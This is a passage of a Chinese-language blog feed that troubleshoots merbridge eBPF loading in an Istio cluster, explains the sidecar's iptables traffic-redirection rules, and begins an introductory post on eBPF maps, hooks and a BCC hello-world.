class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# kubectl get pods -n istio-system</span><br><span class="line">NAME                                    READY   STATUS    RESTARTS      AGE</span><br><span class="line">istio-egressgateway-79bb75fcf9-lttmn    1/1     Running   1             3h10m</span><br><span class="line">istio-ingressgateway-84bfcfd895-p4wbx   1/1     Running   1             3h10m</span><br><span class="line">istiod-6c5cfd79db-vqvws                 1/1     Running   1             3h12m</span><br><span class="line">merbridge-9dhf2                         0/1     Error     1 (15s ago)   23s</span><br><span class="line">root@ubuntu:~# kubectl logs merbridge-9dhf2 -n istio-system</span><br><span class="line">[ -f bpf/mb_connect.c ] &amp;&amp; make -C bpf load || make -C bpf load-from-obj</span><br><span class="line">make[1]: Entering directory '/app/bpf'</span><br><span class="line">clang -O2 -g  -Wall -target bpf -I/usr/include/x86_64-linux-gnu  -DMESH=1 -DUSE_RECONNECT -c mb_connect.c -o mb_connect.o</span><br><span class="line">clang -O2 -g  -Wall -target bpf -I/usr/include/x86_64-linux-gnu  -DMESH=1 -DUSE_RECONNECT -c mb_get_sockopts.c -o mb_get_sockopts.o</span><br><span class="line">clang -O2 -g  -Wall -target bpf -I/usr/include/x86_64-linux-gnu  -DMESH=1 -DUSE_RECONNECT -c mb_redir.c -o mb_redir.o</span><br><span class="line">clang -O2 -g  -Wall -target bpf -I/usr/include/x86_64-linux-gnu  -DMESH=1 -DUSE_RECONNECT -c mb_sockops.c -o mb_sockops.o</span><br><span class="line">clang -O2 -g  -Wall -target bpf -I/usr/include/x86_64-linux-gnu  -DMESH=1 -DUSE_RECONNECT -c mb_bind.c -o mb_bind.o</span><br><span class="line">[ -f /sys/fs/bpf/cookie_original_dst ] || sudo bpftool map create /sys/fs/bpf/cookie_original_dst type lru_hash key 4 value 12 entries 65535 name cookie_original_dst</span><br><span class="line">[ -f /sys/fs/bpf/local_pod_ips ] || sudo bpftool map create /sys/fs/bpf/local_pod_ips type hash key 4 value 4 entries 1024 name local_pod_ips</span><br><span class="line">[ -f /sys/fs/bpf/process_ip ] || sudo bpftool map create /sys/fs/bpf/process_ip type lru_hash key 4 value 4 entries 1024 name process_ip</span><br><span class="line">sudo bpftool prog load mb_connect.o /sys/fs/bpf/connect \</span><br><span class="line">        map name cookie_original_dst pinned /sys/fs/bpf/cookie_original_dst \</span><br><span class="line">        map name local_pod_ips pinned /sys/fs/bpf/local_pod_ips \</span><br><span class="line">        map name process_ip pinned /sys/fs/bpf/process_ip</span><br><span class="line">sudo bpftool cgroup attach /sys/fs/cgroup /sys/fs/cgroup/unified connect4 pinned /sys/fs/bpf/connect</span><br><span class="line">Error: invalid attach type</span><br><span class="line">make[1]: *** [Makefile:90: load-connect] Error 255</span><br><span class="line">make[1]: Leaving directory '/app/bpf'</span><br><span class="line">make[1]: Entering directory '/app/bpf'</span><br><span class="line">[ -f /sys/fs/bpf/cookie_original_dst ] || sudo bpftool map create /sys/fs/bpf/cookie_original_dst type lru_hash key 4 value 12 entries 65535 name cookie_original_dst</span><br><span class="line">[ -f /sys/fs/bpf/local_pod_ips ] || sudo bpftool map create /sys/fs/bpf/local_pod_ips type hash key 4 value 4 entries 1024 name local_pod_ips</span><br><span class="line">[ -f /sys/fs/bpf/process_ip ] || sudo bpftool map create /sys/fs/bpf/process_ip type lru_hash key 4 value 4 entries 1024 name process_ip</span><br><span class="line">sudo bpftool prog load mb_connect.o /sys/fs/bpf/connect \</span><br><span class="line">        map name cookie_original_dst pinned /sys/fs/bpf/cookie_original_dst \</span><br><span class="line">        map name local_pod_ips pinned /sys/fs/bpf/local_pod_ips \</span><br><span class="line">        map name process_ip pinned /sys/fs/bpf/process_ip</span><br><span class="line">Error: failed to pin program cgroup/connect4</span><br><span class="line">make[1]: *** [Makefile:89: load-connect] Error 255</span><br><span class="line">make[1]: Leaving directory '/app/bpf'</span><br><span class="line">make: *** [Makefile:3: load] Error 2</span><br><span class="line">panic: unexpected exit code: 2, err: exit status 2</span><br><span class="line">goroutine 1 [running]:</span><br><span class="line">main.main()</span><br><span class="line">        /app/cmd/mbctl/main.go:68 +0x725</span><br></pre></td></tr></table></figure><p>最后发现，cgroup v2 是单一层级树，因此只有一个挂载点即<code>/sys/fs/cgroup/unified</code></p><p><a href="https://github.com/merbridge/merbridge/issues/60" target="_blank" rel="noopener">https://github.com/merbridge/merbridge/issues/60</a></p><h4 id="iptables注入解析"><a href="#iptables注入解析" class="headerlink" title="iptables注入解析"></a>iptables注入解析</h4><p>查看<code>productpage</code> pod的<code>istio-proxy</code>容器中的进程</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# docker top `docker ps|grep "istio-proxy_productpage"|cut -d " " -f1`</span><br><span class="line">UID                 PID                 PPID                C                   STIME               TTY                 TIME                CMD</span><br><span class="line">1337                9391                9369                0                   Feb16               ?                   00:03:14            /usr/local/bin/pilot-agent proxy sidecar --domain default.svc.cluster.local --proxyLogLevel=warning --proxyComponentLogLevel=misc:error --log_output_level=default:info --concurrency 2</span><br><span class="line">1337                10017               9391                0                   Feb16               ?                   00:18:42            /usr/local/bin/envoy -c etc/istio/proxy/envoy-rev0.json --restart-epoch 0 --drain-time-s 45 --drain-strategy immediate --parent-shutdown-time-s 60 --local-address-ip-version v4 --bootstrap-version 3 --file-flush-interval-msec 1000 --disable-hot-restart --log-format %Y-%m-%dT%T.%fZ?%l?envoy %n?%v -l warning --component-log-level misc:error --concurrency 2</span><br></pre></td></tr></table></figure><p>nsenter进入sidecar容器的命名空间</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# nsenter -n --target 9391</span><br></pre></td></tr></table></figure><p>在该进程的命名空间下查看其 iptables 规则链</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">查看NAT表中规则配置的详细信息</span></span><br><span class="line">root@ubuntu:~# iptables -t nat -L -v</span><br><span class="line"><span class="meta">#</span><span class="bash">PREROUTING链：用于目标地址转换，将所有入站TCP流量跳转到ISTIO_INBOUND链上</span></span><br><span class="line">Chain PREROUTING (policy ACCEPT 215K packets, 13M bytes)</span><br><span class="line"> pkts bytes target     prot opt in     out     source               destination</span><br><span class="line"> 216K   13M ISTIO_INBOUND  tcp  --  any    any     anywhere             anywhere</span><br><span class="line"><span class="meta">#</span><span class="bash">INPUT链：处理输入数据包，非TCP流量将继续走OUTPUT链</span></span><br><span class="line">Chain INPUT (policy ACCEPT 216K packets, 13M bytes)</span><br><span class="line"> pkts bytes target     prot opt in     out     source               destination</span><br><span class="line"><span class="meta">#</span><span class="bash">OUTPUT链：将所有出站数据包跳转到ISTIO_OUTPUT链上</span></span><br><span class="line">Chain OUTPUT (policy ACCEPT 25827 packets, 2191K bytes)</span><br><span class="line"> pkts bytes target     prot opt in     out     source               destination</span><br><span class="line"> 7274  436K ISTIO_OUTPUT  tcp  --  any    any     anywhere             anywhere</span><br><span class="line"><span class="meta">#</span><span class="bash">POSTROUTING链：所有数据包流出网卡时都要先进入POSTROUTING链，内核根据数据包目的地判断是否转发</span></span><br><span class="line">Chain POSTROUTING (policy ACCEPT 29847 packets, 2432K bytes)</span><br><span class="line"> pkts bytes target     prot opt in     out     source               destination</span><br><span class="line"><span class="meta">#</span><span class="bash">ISTIO_INBOUND链：将所有入站流量重定向到ISTIO_IN_REDIRECT链上</span></span><br><span class="line">Chain ISTIO_INBOUND (1 references)</span><br><span class="line"> pkts bytes target     prot opt in     out     source               destination</span><br><span class="line">    0     0 RETURN     tcp  --  any    any     anywhere             anywhere             tcp dpt:15008</span><br><span class="line">    0     0 RETURN     tcp  --  any    any     anywhere             anywhere             tcp dpt:ssh</span><br><span class="line">    0     0 RETURN     tcp  --  any    any     anywhere             anywhere             tcp dpt:15090</span><br><span class="line"> 215K   13M RETURN     tcp  --  any    any     anywhere             anywhere             tcp dpt:15021</span><br><span class="line">    0     0 RETURN     tcp  --  any    any     anywhere             anywhere             tcp dpt:15020</span><br><span class="line"> 1256 75360 ISTIO_IN_REDIRECT  tcp  --  any    any     anywhere             anywhere</span><br><span class="line"><span class="meta">#</span><span class="bash">ISTIO_IN_REDIRECT链：将所有的入站流量跳转到本地的15006端口，至此成功的拦截了流量到sidecar中</span></span><br><span class="line">Chain ISTIO_IN_REDIRECT (3 references)</span><br><span class="line"> pkts bytes target     prot opt in     out     source               destination</span><br><span class="line"> 1256 75360 REDIRECT   tcp  --  any    any     anywhere             anywhere             redir ports 15006</span><br><span class="line"><span class="meta">#</span><span class="bash">ISTIO_OUTPUT链：选择需要重定向到Envoy（即本地） 的出站流量</span></span><br><span class="line">Chain ISTIO_OUTPUT (1 references)</span><br><span class="line"> pkts bytes target     prot opt in     out     source               destination</span><br><span class="line"> 2479  149K RETURN     all  --  any    lo      127.0.0.6            anywhere</span><br><span class="line">    0     0 ISTIO_IN_REDIRECT  all  --  any    lo      anywhere            !localhost            owner UID match 1337</span><br><span class="line">    0     0 RETURN     all  --  any    lo      anywhere             anywhere             ! owner UID match 1337</span><br><span class="line">  775 46500 RETURN     all  --  any    any     anywhere             anywhere             owner UID match 1337</span><br><span class="line">    0     0 ISTIO_IN_REDIRECT  all  --  any    lo      anywhere            !localhost            owner GID match 1337</span><br><span class="line">    0     0 RETURN     all  --  any    lo      anywhere             anywhere             ! owner GID match 1337</span><br><span class="line">    0     0 RETURN     all  --  any    any     anywhere             anywhere             owner GID match 1337</span><br><span class="line">    0     0 RETURN     all  --  any    any     anywhere             localhost</span><br><span class="line"> 4020  241K ISTIO_REDIRECT  all  --  any    any     anywhere             anywhere</span><br><span class="line"><span class="meta">#</span><span class="bash">ISTIO_REDIRECT链：将所有流量重定向到Sidecar（即本地）的15001端口</span></span><br><span class="line">Chain ISTIO_REDIRECT (1 references)</span><br><span class="line"> pkts bytes target     prot opt in     out     source               destination</span><br><span class="line"> 4020  241K REDIRECT   tcp  --  any    any     anywhere             anywhere             redir ports 15001</span><br></pre></td></tr></table></figure><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><a href="https://istio.io/latest/zh/docs/" target="_blank" rel="noopener">https://istio.io/latest/zh/docs/</a></li><li><a href="https://github.com/iovisor/bcc/blob/master/docs/reference_guide.md" target="_blank" rel="noopener">https://github.com/iovisor/bcc/blob/master/docs/reference_guide.md</a></li><li><a href="https://arthurchiao.art/blog/cgroupv2-zh/" target="_blank" rel="noopener">https://arthurchiao.art/blog/cgroupv2-zh/</a></li><li><a href="https://arthurchiao.art/blog/bpf-advanced-notes-1-zh/" target="_blank" rel="noopener">https://arthurchiao.art/blog/bpf-advanced-notes-1-zh/</a></li><li><a href="https://www.zsythink.net/archives/1199" target="_blank" rel="noopener">https://www.zsythink.net/archives/1199</a></li><li><a href="https://github.com/istio/istio/tree/master/samples" target="_blank" rel="noopener">https://github.com/istio/istio/tree/master/samples</a></li><li><a href="https://jimmysong.io/blog/envoy-sidecar-injection-in-istio-service-mesh-deep-dive/" target="_blank" rel="noopener">https://jimmysong.io/blog/envoy-sidecar-injection-in-istio-service-mesh-deep-dive/</a></li><li><a href="https://buaq.net/go-78524.html" target="_blank" rel="noopener">https://buaq.net/go-78524.html</a></li><li><a href="https://kubernetes.io/zh/docs/reference/access-authn-authz/rbac/" target="_blank" rel="noopener">https://kubernetes.io/zh/docs/reference/access-authn-authz/rbac/</a></li><li><a href="https://manpages.ubuntu.com/manpages/focal/man7/bpf-helpers.7.html" target="_blank" rel="noopener">https://manpages.ubuntu.com/manpages/focal/man7/bpf-helpers.7.html</a></li><li><a href="https://github.com/torvalds/linux/blob/master/tools/testing/selftests/bpf/progs/sockopt_sk.c" target="_blank" rel="noopener">https://github.com/torvalds/linux/blob/master/tools/testing/selftests/bpf/progs/sockopt_sk.c</a></li><li><a href="https://github.com/torvalds/linux/blob/cfb92440ee71adcc2105b0890bb01ac3cddb8507/include/uapi/linux/netfilter_ipv4.h#L52" target="_blank" rel="noopener">https://github.com/torvalds/linux/blob/cfb92440ee71adcc2105b0890bb01ac3cddb8507/include/uapi/linux/netfilter_ipv4.h#L52</a></li><li><a href="https://www.cnblogs.com/tencent-cloud-native/p/15696518.html" target="_blank" rel="noopener">https://www.cnblogs.com/tencent-cloud-native/p/15696518.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;环境准备&quot;&gt;&lt;a href=&quot;#环境准备&quot; class=&quot;headerlink&quot; title=&quot;环境准备&quot;&gt;&lt;/a&gt;环境准备&lt;/h4&gt;&lt;h5 id=&quot;Docker安装&quot;&gt;&lt;a href=&quot;#Docker安装&quot; class=&quot;headerlink&quot; title=&quot;D
      
    
    </summary>
    
    
      <category term="Cloud Security" scheme="elssm.github.io/tags/Cloud-Security/"/>
    
  </entry>
  
  <entry>
    <title>浅入浅出eBPF</title>
    <link href="elssm.github.io/2022/01/21/%E6%B5%85%E5%85%A5%E6%B5%85%E5%87%BAeBPF/"/>
    <id>elssm.github.io/2022/01/21/浅入浅出eBPF/</id>
    <published>2022-01-21T01:19:21.000Z</published>
    <updated>2022-01-27T08:46:03.508Z</updated>
    
    <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>最近因为一些原因开始学习eBPF，后续也将持续学习eBPF的一些具体应用。</p><h4 id="BPF发展史"><a href="#BPF发展史" class="headerlink" title="BPF发展史"></a>BPF发展史</h4><p><img src="/2022/01/21/浅入浅出eBPF/3.jpeg" alt="3"></p><h4 id="BPF介绍"><a href="#BPF介绍" class="headerlink" title="BPF介绍"></a>BPF介绍</h4><p>BPF(伯克利包过滤器)，也称为cBPF，在1992年提出，目的是为了提供一种过滤包的方法，并且要避免从内核空间到用户空间的无用的数据包复制行为。最初，BPF是在BSD内核实现的， 后来，由于其出色的设计思想，其他操作系统也将其引入, 包括Linux。</p><p>BPF架构如下图所示，从图中可以看到，BPF是作为内核报文传输路径的一个旁路存在，当报文到达内核驱动程序后，内核在将报文上送协议栈的同时，会额外将报文的副本交给BPF，之后报文会经过BPF内部逻辑的过滤。</p><p><img src="/2022/01/21/浅入浅出eBPF/1.png" alt="1"></p><h4 id="eBPF介绍"><a href="#eBPF介绍" class="headerlink" title="eBPF介绍"></a>eBPF介绍</h4><p>eBPF是扩展的BPF，2014 年初，Alexei Starovoitov 实现了 eBPF（extended Berkeley Packet Filter）。经过重新设计，eBPF 演进为一个通用执行引擎，可基于此开发性能分析工具、软件定义网络等诸多场景。eBPF 最早出现在 3.18 内核中，此后原来的 BPF 就被称为经典 BPF，缩写 cBPF（classic BPF），cBPF 现在已经基本废弃。现在，Linux 内核只运行 eBPF，内核会将加载的 cBPF 字节码透明地转换成 eBPF 再执行。</p><p>从eBPF官网摘录下段文字说明</p><p>eBPF is a revolutionary technology with origins in the Linux kernel that can run sandboxed programs in an operating system kernel. It is used to safely and efficiently extend the capabilities of the kernel without requiring to change kernel source code or load kernel modules.（一项革新性技术！！！有苹果发布会内味。起源于Linux内核，可以在操作系统内核中运行沙箱程序，被用来安全的扩展内核功能，不用去更改内核源码或加载内核模块）</p><p>Historically, the operating system has always been an ideal place to implement observability, security, and networking functionality due to the kernel’s privileged ability to oversee and control the entire system. At the same time, an operating system kernel is hard to evolve due to its central role and high requirement towards stability and security. The rate of innovation at the operating system level has thus traditionally been lower compared to functionality implemented outside of the operating system.（操作系统一直是实现可观测性、安全性和网络功能的最佳场所，因为内核具有监视和控制整个系统的权限。同时，由于其核心作用和对于稳定性和安全性的高要求，使得它很难进化。因此，和在操作系统之外实现的功能相比，操作系统级别的创新率就会偏低）</p><p>eBPF changes this formula fundamentally. By allowing to run sandboxed programs within the operating system, application developers can run eBPF programs to add additional capabilities to the operating system at runtime. The operating system then guarantees safety and execution efficiency as if natively compiled with the aid of a Just-In-Time (JIT) compiler and verification engine. This has led to a wave of eBPF-based projects covering a wide array of use cases, including next-generation networking, observability, and security functionality.（eBPF从根本上改变了这个功能，通过允许在操作系统内运行沙箱程序，应用开发者可以通过运行eBPF程序在操作系统运行时添加额外功能。操作系统会保证安全性和执行效率，就像在JIT编译器和验证器的帮助下进行本机编译一样。接着就出现了一系列基于eBPF的项目，例如下一代网络、可观察性和安全功能等）</p><p>Today, eBPF is used extensively to drive a wide variety of use cases: Providing high-performance networking and load-balancing in modern data centers and cloud native environments, extracting fine-grained security observability data at low overhead, helping application developers trace applications, providing insights for performance troubleshooting, preventive application and container runtime security enforcement, and much more. The possibilities are endless, and the innovation that eBPF is unlocked has only just begun.（今天，eBPF被用于驱动各种各样的用例，例如在数据中心和云本机环境提供高性能网络和负载均衡、以较低的开销提取细粒度安全可观测性数据、帮助应用程序开发人员跟踪应用程序、为性能故障排除提供一些方法，预防应用程序和容器运行时的安全实施等等，eBPF有无限可能，eBPF才刚刚开始）</p><h4 id="eBPF对比cBPF"><a href="#eBPF对比cBPF" class="headerlink" title="eBPF对比cBPF"></a>eBPF对比cBPF</h4><p><strong>eBPF</strong>相对于<strong>cBPF</strong>的增强如下:</p><ul><li>处理器原生指令集建模，因此更接近底层处理器架构， 性能相比cBPF提升4倍</li><li>指令集从33个扩展到了114多个，依然保持了足够的简洁</li><li>寄存器从2个32位寄存器扩展到了11个 64 位的寄存器 (其中1个只读的栈指针)</li><li>引入 bpf_call 指令和寄存器传参约定，实现零(额外)开销内核函数调用</li><li>虚拟机的最大栈空间是 512 字节(cBPF 为 16 个字节)</li><li>引入了 map 结构，用于用户空间程序与内核中的 eBPF 程序数据交换</li><li>最大指令数初期为 4096，现在已经将这个限制放大到了100万条</li></ul><h4 id="eBPF工作机制"><a href="#eBPF工作机制" class="headerlink" title="eBPF工作机制"></a>eBPF工作机制</h4><p><img src="/2022/01/21/浅入浅出eBPF/2.png" alt="2"></p><p>eBPF分为用户空间和内核空间，用户空间和内核空间的交互有两种方式</p><ul><li>BPF map：用于将内核中实现的统计摘要信息（比如测量延迟、堆栈信息）等回传至用户空间</li><li>perf-event：用于将内核采集的事件实时发送至用户空间，用户空间程序实时读取分析</li></ul><p>eBPF的工作逻辑是</p><ul><li>BPF程序通过<code>LLVM/Clang</code>编译成eBPF定义的字节码<code>prog.bpf</code></li><li>通过bpf系统调用将bpf字节码指令传入内核</li><li>经过验证器检验字节码的安全性<ul><li>加载eBPF程序的进程具有所需的权限，除非启用了非特权eBPF，否则只有特权进程才能加载eBPF程序</li><li>程序不会崩溃或以其它方式损坏系统</li><li>程序始终可以运行完成</li></ul></li><li>在确认字节码安全后将其加载对应的内核模块执行，在BPF虚拟机中会判断是否开启JIT(即时编译)，如果开启了JIT，则会通过JIT解释器将程序字节码转为特定的机器码执行，如果没有开启JIT，则通过内核解释器执行</li></ul><p>eBPF观测技术相关的程序类型有<code>kprobes</code>、<code>uporbes</code>、<code>tracepoint</code>、<code>perf_event</code></p><ul><li>kprobes：实现内核中动态跟踪。kprobes可以跟踪到Linux内核中的函数入口或返回点，但是不是稳定ABI接口，可能会因为内核版本变化导致，导致跟踪失效。理论上可以跟踪到所有导出的符号<code>/proc/kallsyms</code>。</li><li>uprobes：用户级别的动态跟踪。与kprobes类似，只是跟踪的函数为用户程序中的函数。</li><li>tracepoints：内核中静态跟踪。tracepoints是内核开发人员维护的跟踪点，能够提供稳定的ABI接口，但是由于是研发人员维护，数量和场景可能受限。</li><li>perf_events：定时采样和PMC。</li></ul><h4 id="eBPF使用场景"><a href="#eBPF使用场景" class="headerlink" title="eBPF使用场景"></a>eBPF使用场景</h4><ul><li>系统性能监控/分析工具：能够实现性能监控工具、分析工具等常用的系统分析工具，比如 sysstate 工具集，里面提供了 vmstate，pidstat 等多种工具，一些常用的 top、netstat（netstat 可被 SS 替换掉），uptime、iostat 等这些工具多数都是从 /proc、/sys、/dev 中获取的会对系统产生一定的开销，不适合频繁的调用。比如在使用 top 的时候通过 cpu 排序可以看到 top cpu 占用也是挺高的，使用 eBPF 可以在开销相对小的情况下获取系统信息，定时将 eBPF 采集的数据 copy 到用户态，然后将其发送到分析监控平台。</li><li>用户程序活体分析：做用户程序活体分析，比如 openresty 中 lua 火焰图绘制，程序内存使用监控，cdn 服务异常请求分析，程序运行状态的查看，这些操作都可以在程序无感的情况下做到，可以有效提供服务质量。</li><li>防御攻击：比如 DDoS 攻击，DDoS 攻击主要是在第七层、第三层以及第四层。第七层的攻击如 http 攻击，需要应用服务这边处理。第四层攻击，如 tcp syn 可以通过 iptable 拒绝异常的 ip，当然前提是能发现以及难点是如何区分正常流量和攻击流量，简单的防攻击会导致一些误伤，另外 tcp syn 也可以通过内核参数保护应用服务。第 3 层攻击，如 icmp。对于攻击一般会通过一些特殊的途径去发现攻击，而攻击的防御则可以通过 XDP 直接在网络包未到网络栈之前就处理掉，性能非常的优秀。</li><li>流控：可以控制网络传输速率，比如 tc。</li><li>替换 iptable：在 k8s 中iptable的规则往往会相当庞大，而iptable规则越多，性能也越差，使用eBPF就可以解决</li><li>服务调优：在cdn服务中难免会出现一些指标突刺的情况，这种突刺拉高整体的指标，对于这种突刺时常会因为找不到切入点而无从下手，eBPF存在这种潜力能帮助分析解决该问题，当eBPF发现网络抖动，会主动采集当时应用的运行状态。</li></ul><h4 id="eBPF-hooks"><a href="#eBPF-hooks" class="headerlink" title="eBPF hooks"></a>eBPF hooks</h4><p>eBPF hooks即eBPF钩子，指的是在内核中哪些地方可以加载eBPF程序，在目前的Linux内核中已经有近10中钩子</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kernel functions（kprobes）</span><br><span class="line">userspace functions（uprobes）</span><br><span class="line">system calls</span><br><span class="line">fentry/fexit</span><br><span class="line">Tracepoints</span><br><span class="line">network devices（tc/xdp）</span><br><span class="line">network routes</span><br><span class="line">TCP congestion algorithms</span><br><span class="line">sockets（data level）</span><br></pre></td></tr></table></figure><h4 id="eBPF-Map"><a href="#eBPF-Map" class="headerlink" title="eBPF Map"></a>eBPF Map</h4><p>在eBPF中可以利用map在eBPF程序调用之间保存状态信息，也可以利用map在用户态程序和内核之间共享数据等。内核提供了一个系统调用<code>bpf()</code>，以让用户态程序可以根据使用场景来创建合适的map。这个系统调用会返回一个关联了这个map对象的文件描述符，后续用户态程序可以用这个文件描述符来对相应的map对象进行一些操作，如查询、更新和删除，这部分的接口在<code>tools/lib/bpf/bpf.h</code>中定义了。关于这个<code>bpf()</code>系统调用以及map操作接口的详细信息，可以参考相关资料，其中<code>bpf()</code>系统调用相关的信息可以在<code>man page</code>中找到，而map操作相关的接口可以在 <code>tools/lib/bpf/bpf.h</code> 中看到具体的实现。</p><p>eBPF支持的map类型如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">BPF_MAP_TYPE_HASH：哈希表</span><br><span class="line">BPF_MAP_TYPE_ARRAY：数组映射，已针对快速查找速度进行了优化，通常用于计数器</span><br><span class="line">BPF_MAP_TYPE_PROG_ARRAY：对应eBPF程序的文件描述符数组；用于实现跳转表和子程序以处理特定的数据包协议</span><br><span class="line">BPF_MAP_TYPE_PERCPU_ARRAY：每个CPU的阵列，用于实现延迟的直方图</span><br><span class="line">BPF_MAP_TYPE_PERF_EVENT_ARRAY：存储指向struct perf_event的指针，用于读取和存储perf事件计数器</span><br><span class="line">BPF_MAP_TYPE_CGROUP_ARRAY：存储指向控制组的指针</span><br><span class="line">BPF_MAP_TYPE_PERCPU_HASH：每个CPU的哈希表</span><br><span class="line">BPF_MAP_TYPE_LRU_HASH：仅保留最近使用项目的哈希表</span><br><span class="line">BPF_MAP_TYPE_LRU_PERCPU_HASH：每个CPU的哈希表，仅保留最近使用的项目</span><br><span class="line">BPF_MAP_TYPE_LPM_TRIE：最长前缀匹配树，适用于将IP地址匹配到某个范围</span><br><span class="line">BPF_MAP_TYPE_STACK_TRACE：存储堆栈跟踪</span><br><span class="line">BPF_MAP_TYPE_ARRAY_OF_MAPS：地图中地图数据结构</span><br><span class="line">BPF_MAP_TYPE_HASH_OF_MAPS：地图中地图数据结构</span><br><span class="line">BPF_MAP_TYPE_DEVICE_MAP：用于存储和查找网络设备引用</span><br><span class="line">BPF_MAP_TYPE_SOCKET_MAP：存储和查找套接字，并允许使用BPF辅助函数进行套接字重定向</span><br></pre></td></tr></table></figure><h4 id="eBPF-Helper-Function"><a href="#eBPF-Helper-Function" class="headerlink" title="eBPF Helper Function"></a>eBPF Helper Function</h4><p>eBPF程序不能调用任意内核函数。如果允许这样做，会将eBPF程序绑定到特定的内核版本，并且会使程序的兼容性复杂化。相反，eBPF程序可以对helper函数进行函数调用，helper函数是内核提供的一种稳定的API。</p><p><img src="/2022/01/21/浅入浅出eBPF/5.png" alt="5"></p><p>一些可用于辅助调用的例子有</p><ul><li>生成随机数</li><li>获取当前时间和日期</li><li>eBPF map访问</li><li>获取进程/cgroup上下文</li><li>操作网络数据包和转发逻辑</li></ul><h4 id="BCC"><a href="#BCC" class="headerlink" title="BCC"></a>BCC</h4><h5 id="bcc介绍"><a href="#bcc介绍" class="headerlink" title="bcc介绍"></a>bcc介绍</h5><p>源码地址：<a href="https://github.com/iovisor/bcc" target="_blank" rel="noopener">https://github.com/iovisor/bcc</a></p><p>BCC工具全称BPF Compiler Collection (BCC)，是一个很强大的库，强大的内核分析工具eBPF就是基于bcc开发的，利用这个库可以从底层获取操作系统性能信息，网络性能信息等许多与内核交互的信息。bcc使得bpf程序更容易被书写，bcc使用 Python和Lua，虽然核心依旧是一部分C语言代码（BPF C代码）。但是我们很快就可以体验了，这比手动安装 C 语言依赖、编译、插入内核要方便的多。</p><h5 id="bcc-tools安装"><a href="#bcc-tools安装" class="headerlink" title="bcc-tools安装"></a>bcc-tools安装</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum -y install bcc-tools</span><br></pre></td></tr></table></figure><h5 id="HelloWorld"><a href="#HelloWorld" class="headerlink" title="HelloWorld"></a>HelloWorld</h5><p>代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bcc <span class="keyword">import</span> BPF</span><br><span class="line"></span><br><span class="line">BPF(text=<span class="string">'int kprobe__sys_clone(void *ctx)&#123;bpf_trace_printk("Hello,World!\\n"); return 0;&#125;'</span>).trace_print()</span><br></pre></td></tr></table></figure><p>执行如下</p><p><img src="/2022/01/21/浅入浅出eBPF/4.png" alt="4"></p><p>分析如下</p><ul><li><p>text定义了一个嵌入的用C语言写的BPF程序</p></li><li><p><code>kprobe__sys_clone()</code>是一个通过内核探针(kprobe)进行内核动态跟踪的快捷方式。如果一个C函数名开头为<code>kprobe__</code>，则后面部分实际为设备的内核函数名，这里是<code>sys_clone()</code></p></li><li><p><code>bpf_trace_printk()</code>用于<code>printf()</code>到<code>trace_pipe</code>。一般用来快速调试</p></li><li><p><code>return 0</code>用来关闭凭证</p></li><li><p><code>.trace_print()</code>，一个bcc实例会通过这个读取<code>trace_pipe</code>并打印</p></li></ul><h4 id="利用eBPF提升socket性能"><a href="#利用eBPF提升socket性能" class="headerlink" 